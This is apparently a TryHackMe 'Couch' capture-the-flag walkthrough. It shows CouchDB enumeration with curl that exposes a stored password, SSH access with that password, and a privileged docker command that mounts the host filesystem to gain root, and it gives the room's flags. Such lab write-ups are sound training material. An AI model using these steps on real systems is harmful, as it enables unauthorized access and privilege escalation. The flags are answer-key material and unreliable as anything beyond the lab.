# Couch Walkthrough
### Link
- https://tryhackme.com/room/couch
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
map scan report for 10.10.109.34
Host is up (0.10s latency).
Not shown: 65504 closed ports, 29 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4670.29 seconds
```

**Question**
#### Scan the machine. How many ports are open?

**Answer** 
#### 2

**Question**
#### What is the database management system installed on the server?

**Answer** 
#### CouchDB

**Question**
#### What port is the database management system running on?

**Answer** 
#### 5984

**Question**
#### What is the version of the management system installed on the server?

**Answer** 
#### 1.6.1

**Question**
#### What is the path for the web administration tool for this database management system?


Let's check the documentation about this Database [CouchDB](https://www.tutorialspoint.com/couchdb/couchdb_curl_futon.htm)

If we check the section: *Starting Futon*, we can check if we have access to CouchDB through the web browser
```
http://[IP]:5984/_utils
```

It works ^^

**Answer** 
#### _utils

**Question**
#### What is the path to list all databases in the web browser of the database management system?

Also in the documentation [CouchDB](https://www.tutorialspoint.com/couchdb/couchdb_curl_futon.htm), you can find the appropriate command

```
 curl -X GET http://10.10.109.34:5984/_all_dbs
```

Result
```
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```

**Answer** 
#### _all_dbs

**Question**
#### What are the credentials found in the web administration tool?

For this point, we should to navigate in each table but the **secret** drew my attention ^^

```
curl http://10.10.109.34:5984/secret
```
```
{"db_name":"secret","doc_count":1,"doc_del_count":0,"update_seq":2,"purge_seq":0,"compact_running":false,"disk_size":8287,"data_size":339,"instance_start_time":"1639589828903886","disk_format_version":6,"committed_update_seq":2}
```
It looks like we have enough access right to read this table. Let's check the content
```
curl http://10.10.109.34:5984/secret/_all_docs
{"total_rows":1,"offset":0,"rows":[
{"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"}}
]}
```
So you have an **id** : **a1320dd69fb4570d0a3d26df4e000be7**. Let's check the information related to this **id**
```
curl http://10.10.109.34:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}
```
We found a user **atena** and the password attached to this user **t4qfzcc4qN##**
**Answer** 
#### t4qfzcc4qN##

---
### Exploitation

**Question**
#### Compromise the machine and locate user.txt

With the credentials found in the DB, we can try to SSH the server ^^
```
ssh atena@10.10.109.34
The authenticity of host '10.10.109.34 (10.10.109.34)' can't be established.
ED25519 key fingerprint is SHA256:QXIT4W/vOthS71YtOAr7s67oloxpMmr0GLRVL9iVFJM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.109.34' (ED25519) to the list of known hosts.
atena@10.10.109.34's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
atena@ubuntu:~$ ls
user.txt
atena@ubuntu:~$ cat user.txt
THM{1ns3cure_couchdb}
```
**Answer** 
#### THM{1ns3cure_couchdb}


---
### Privilege Escalation

**Question**
#### Escalate privileges and obtain root.txt

Let's check what **atena** can do
```
atena@ubuntu:~$ sudo -l
[sudo] password for atena:
Sorry, user atena may not run sudo on ubuntu.
```
Now let's check all files and folder.
```
atena@ubuntu:~$ ls -la
total 48
drwxr-xr-x 6 atena atena 4096 Dec 18  2020 .
drwxr-xr-x 3 root  root  4096 Oct 24  2020 ..
-rw------- 1 atena atena 3171 Dec 18  2020 .bash_history
-rw-r--r-- 1 atena atena  220 Oct 24  2020 .bash_logout
-rw-r--r-- 1 atena atena 3771 Oct 24  2020 .bashrc
drwxr-xr-x 3 root  root  4096 Oct 24  2020 .bundle
drwx------ 2 atena atena 4096 Oct 24  2020 .cache
drwx------ 2 root  root  4096 Oct 24  2020 .gnupg
drwxrwxr-x 2 atena atena 4096 Dec 18  2020 .nano
-rw-r--r-- 1 atena atena  655 Oct 24  2020 .profile
-rw-r--r-- 1 atena atena    0 Oct 24  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root  root   183 Oct 24  2020 .wget-hsts
-rw-rw-r-- 1 atena atena   22 Dec 18  2020 user.txt
```

Interesting hidden file : **.bash_history**. We have the listing of all commands used previously.
```
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```
Let's try this command from the SSH session
```
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # whoami
root
/ # pwd
/
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # cd /root
~ # ls
~ # cd ..
/ # cd tmp
/tmp # ls
/tmp # cd ..
/ # cd mnt
/mnt # ls
bin             etc             initrd.img.old  lost+found      opt             run             sys             var
boot            home            lib             media           proc            sbin            tmp             vmlinuz
dev             initrd.img      lib64           mnt             root            srv             usr             vmlinuz.old
/mnt # cd root
/mnt/root # ls
root.txt
/mnt/root # cat root.txt
THM{RCE_us1ng_Docker_API}
```
**Answer** 
#### THM{RCE_us1ng_Docker_API}






